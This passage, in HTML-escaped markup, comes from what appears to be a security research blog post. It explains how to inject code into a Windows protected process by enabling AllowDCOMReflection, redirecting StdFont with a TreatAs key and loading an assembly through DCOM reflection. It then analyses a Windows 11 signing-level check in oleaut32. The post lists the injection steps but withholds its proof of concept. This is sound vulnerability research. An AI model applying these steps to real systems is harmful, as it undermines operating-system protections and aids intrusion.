 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span&gt;The blog post discussed exploiting serialization primitives, however there was a much simpler attack which I exploited by using the &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c3&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/dotnet/api/system.type?view%3Dnetframework-4.8.1&quot;&gt;System.Type&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;class over DCOM. With access to a &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c4&quot;&gt;Type&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c6&quot;&gt;&amp;nbsp;object you could perform arbitrary reflection and call any method you liked, including loading an assembly from a byte array which would bypass the signature checking and give full control over the protected process.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2 ROKGfcMygP-c8&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c6&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span&gt;Microsoft &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c3&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/security-updates/SecurityBulletins/2014/ms14-009&quot;&gt;fixed&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;this behavior, but they left a configuration value, &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c3&quot;&gt;&lt;a href=&quot;https://support.microsoft.com/en-gb/topic/marshaling-of-reflection-types-may-not-work-over-dcom-after-you-install-a-security-update-from-security-bulletin-ms14-009-b3ae0bd6-fb65-4e75-b399-0add119cc16f&quot;&gt;AllowDCOMReflection&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, which allows you to turn it back on again. As we&amp;#39;re not elevating privileges, and we have to be running as an administrator to change the COM class registration information, we can just enable DCOM reflection in the registry by writing the &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c4&quot;&gt;AllowDCOMReflection&lt;/span&gt;&lt;span&gt;&amp;nbsp;with the DWORD value of 1 to the &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c4&quot;&gt;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\.NETFramework&lt;/span&gt;&lt;span&gt;&amp;nbsp;key before loading the .NET framework into the protected process.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2 ROKGfcMygP-c8&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c6&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c6&quot;&gt;The following steps need to be taken to achieve injection:&lt;/span&gt;&lt;/p&gt;&lt;ol class=&quot;lst-kix_s9l3chg8etv0-0 start&quot; start=&quot;1&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c14 li-bullet-0&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c6&quot;&gt;Enable DCOM reflection in the registry.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c14 li-bullet-0&quot;&gt;&lt;span&gt;Add the &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c4&quot;&gt;TreatAs&lt;/span&gt;&lt;span&gt;&amp;nbsp;key to redirect &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c4&quot;&gt;StdFont&lt;/span&gt;&lt;span&gt;&amp;nbsp;to the &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c4&quot;&gt;System.Object&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c6&quot;&gt;&amp;nbsp;COM class.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c14 li-bullet-0&quot;&gt;&lt;span&gt;Create the &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c4&quot;&gt;WaaSRemediationAgent&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c6&quot;&gt;&amp;nbsp;object. &lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c14 li-bullet-0&quot;&gt;&lt;span&gt;Use the type library to get the &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c4&quot;&gt;StdFont&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c6&quot;&gt;&amp;nbsp;class type info.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c14 li-bullet-0&quot;&gt;&lt;span&gt;Create a &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c4&quot;&gt;StdFont&lt;/span&gt;&lt;span&gt;&amp;nbsp;object using the &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c4&quot;&gt;CreateInstance&lt;/span&gt;&lt;span&gt;&amp;nbsp;method which will really load the .NET framework and return an instance of the &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c4&quot;&gt;System.Object&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c6&quot;&gt;&amp;nbsp;class.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c14 li-bullet-0&quot;&gt;&lt;span&gt;Use .NET reflection to call the &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c3&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/dotnet/api/system.reflection.assembly.load?view%3Dnetframework-4.8.1%23system-reflection-assembly-load(system-byte())&quot;&gt;System.Reflection.Assembly::Load&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c6&quot;&gt;&amp;nbsp;method with a byte array.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c14 li-bullet-0&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c6&quot;&gt;Create an object in the loaded assembly to force code to execute.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c14 li-bullet-0&quot;&gt;&lt;span&gt;Cleanup all registry changes.&lt;/span&gt;&lt;/li&gt;&lt;/ol&gt;
 &lt;p class=&quot;ROKGfcMygP-c2 ROKGfcMygP-c8&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c6&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span&gt;You&amp;#39;ll need to do these steps in a non .NET language as otherwise the serialization mechanisms will kick in and recreate the reflection objects in the calling process. I wrote my PoC in C++, but you can probably do it from things like Python if you&amp;#39;re so inclined. &lt;/span&gt;&lt;span&gt;I&amp;#39;m not going to make the PoC available &lt;/span&gt;&lt;span&gt;but the code is very similar to the exploit I wrote for &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c3&quot;&gt;&lt;a href=&quot;https://github.com/tyranid/IE11SandboxEscapes/blob/master/CVE-2014-0257/CVE-2014-0257.cpp&quot;&gt;CVE-2014-0257&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c6&quot;&gt;, that&amp;#39;ll give you an example of how to use DCOM reflection in C++. Also note that the default for .NET COM objects is to run them using the v2 framework which is no longer installed by default. Rather than mess around with getting this working with v4 I just installed v2 from the Windows components installer.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2 ROKGfcMygP-c8&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c6&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span&gt;My PoC worked first-time on Windows 10, but unfortunately when I ran it on Windows 11 24H2 it failed. I could create the .NET object, but calling any method on the object failed with the error &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c4&quot;&gt;TYPE_E_CANTLOADLIBRARY&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c6&quot;&gt;. I could have stopped here, having proven my point but I wanted to know what was failing on Windows 11. Lets finish up with diving into that, to see if we could do something to get it to work on the latest version of Windows.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=&quot;ROKGfcMygP-c11&quot; id=&quot;h.rjbjrr4pm1s2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c7 ROKGfcMygP-c15&quot;&gt;The Problem with Windows 11&lt;/span&gt;&lt;/h2&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span&gt;I was able to prove that the issue was related to protected processes, if I changed the service registration to run unprotected then the PoC worked. Therefore there must be something blocking the loading of the library when specifically running in a protected process. This didn&amp;#39;t seem to impact type libraries generally, the loading of &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c4&quot;&gt;stdole&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c6&quot;&gt;&amp;nbsp;worked just fine, so it was something specific to .NET. &lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2 ROKGfcMygP-c8&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c6&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span&gt;After inspecting the behavior of the PoC with Process Monitor it was clear the &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c4&quot;&gt;mscorlib.tlb&lt;/span&gt;&lt;span&gt;&amp;nbsp;library was being loaded to implement the stub class in the server. For some reason it failed to load, which prevented the stub from being created, which in turn caused any call to fail. At this point I had an idea of what&amp;#39;s happening. In the previous &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c3&quot;&gt;&lt;a href=&quot;https://googleprojectzero.blogspot.com/2018/10/injecting-code-into-windows-protected.html&quot;&gt;blog post&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;I discussed attacking the NGEN COM process by modifying the type library it used to create the interface stub to introduce a type-confusion. This allowed me to overwrite the &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c13&quot;&gt;KnownDlls&lt;/span&gt;&lt;span&gt;&amp;nbsp;handle and force an arbitrary DLL to get loaded into memory. I knew from the work of &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c3&quot;&gt;&lt;a href=&quot;https://github.com/itm4n&quot;&gt;Cl&amp;eacute;ment Labro&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c3&quot;&gt;&lt;a href=&quot;https://blog.slowerzs.net/posts/pplsystem/&quot;&gt;others&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;that most of the attacks around &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c13&quot;&gt;KnownDlls&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c6&quot;&gt;&amp;nbsp;are now blocked, but I suspected that there was also some sort of fix for the type library type-confusion trick.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2 ROKGfcMygP-c8&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c6&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span&gt;Digging into &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c4&quot;&gt;oleaut32.dll&lt;/span&gt;&lt;span&gt;&amp;nbsp;I found the offending fix, the &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c4&quot;&gt;VerifyTrust&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c6&quot;&gt;&amp;nbsp;method is shown below:&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;ROKGfcMygP-c2 ROKGfcMygP-c8&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c6&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;table style=&quot;border: 20px solid #e2e1e1; border-radius: 10px&quot; bgcolor=&quot;#e2e1e1&quot;&gt;&lt;tr&gt;&lt;td&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c1&quot;&gt;NTSTATUS&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c1&quot;&gt;VerifyTrust(LoadInfo&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c1&quot;&gt;*load_info)&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c1&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c1&quot;&gt;PS_PROTECTION&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c1&quot;&gt;protection;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c1&quot;&gt;BOOL&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c1&quot;&gt;is_protected;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c7 ROKGfcMygP-c0&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c1&quot;&gt;CheckProtectedProcessForHardening(&amp;amp;is_protected,&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c1&quot;&gt;&amp;amp;protection);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c12&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c1&quot;&gt;(!is_protected)&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c12&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c1&quot;&gt;SUCCESS;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c1&quot;&gt;ULONG&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c1&quot;&gt;flags;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c1&quot;&gt;BYTE&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c1&quot;&gt;level;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c1&quot;&gt;HANDLE&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c1&quot;&gt;handle&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c1&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c1&quot;&gt;load_info-&amp;gt;Handle;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c1&quot;&gt;NTSTATUS&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c1&quot;&gt;status&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c1&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c1&quot;&gt;NtGetCachedSigningLevel(handle,&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c1&quot;&gt;&amp;amp;flags,&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c1&quot;&gt;&amp;amp;level,&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c7 ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c12&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; NULL&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c1&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c12&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c1&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c12&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c1&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c12&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c1&quot;&gt;(FAILED(status)&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c1&quot;&gt;||&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c7 ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c1&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;(flags&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c1&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c10&quot;&gt;0x182&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c1&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c1&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c10&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c1&quot;&gt;||&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c7 ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c1&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;FAILED(NtCompareSigningLevels(level,&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c10&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c1&quot;&gt;)))&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c1&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c1&quot;&gt;status&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c1&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c1&quot;&gt;NtSetCachedSigningLevel(&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c10&quot;&gt;0x804&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c1&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c10&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c1&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c1&quot;&gt;&amp;amp;handle,&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c10&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c1&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c1&quot;&gt;handle);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c1&quot;&gt;}&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c12&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c1&quot;&gt;status;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c0 ROKGfcMygP-c1&quot;&gt;}&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;p class=&quot;ROKGfcMygP-c2 ROKGfcMygP-c8&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c6&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;span&gt;&lt;span&gt;This method is called during the loading of the type library. It&amp;#39;s using the cached signing level, again something I mentioned in the previous blog post, to verify if the file has a signing level of 12, which corresponds to &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c13&quot;&gt;Windows&lt;/span&gt;&lt;span&gt;&amp;nbsp;signing level. If it doesn&amp;#39;t have the appropriate cached signing level the code will try to use &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c4&quot;&gt;NtSetCachedSigningLevel&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c6&quot;&gt;&amp;nbsp;to set it. If that fails it assumes the file can&amp;#39;t be loaded in the protected process and returns the error, which results in the type library failing to load. Note, a similar fix blocks the abuse of the Running Object Table to reference an out-of-process type library, but that&amp;#39;s not relevant to this discussion.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2 ROKGfcMygP-c8&quot;&gt;&lt;span class=&quot;ROKGfcMygP-c6&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ROKGfcMygP-c2&quot;&gt;&lt;span&gt;Based on the output from &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c4&quot;&gt;Get-AuthenticodeSignature&lt;/span&gt;&lt;span&gt;&amp;nbsp;the &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c4&quot;&gt;mscorlib.tlb&lt;/span&gt;&lt;span&gt;&amp;nbsp;file is signed, admittedly with a catalog signing. The signing certificate is &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c4&quot;&gt;Microsoft Windows Production PCA 2011&lt;/span&gt;&lt;span&gt;&amp;nbsp;which is exactly the same certificate as the .NET Runtime DLL so there should be no reason it wouldn&amp;#39;t get a &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c13&quot;&gt;Windows&lt;/span&gt;&lt;span&gt;&amp;nbsp;signing level. Let&amp;#39;s try and set the cached signature level manually using my &lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c3&quot;&gt;&lt;a href=&quot;https://www.powershellgallery.com/packages/NtObjectManager&quot;&gt;NtObjectManager&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;ROKGfcMygP-c6&quot;&gt;&amp;nbsp;PowerShell module to see if we get any insights:&lt;/span&gt;&lt;/p&gt;
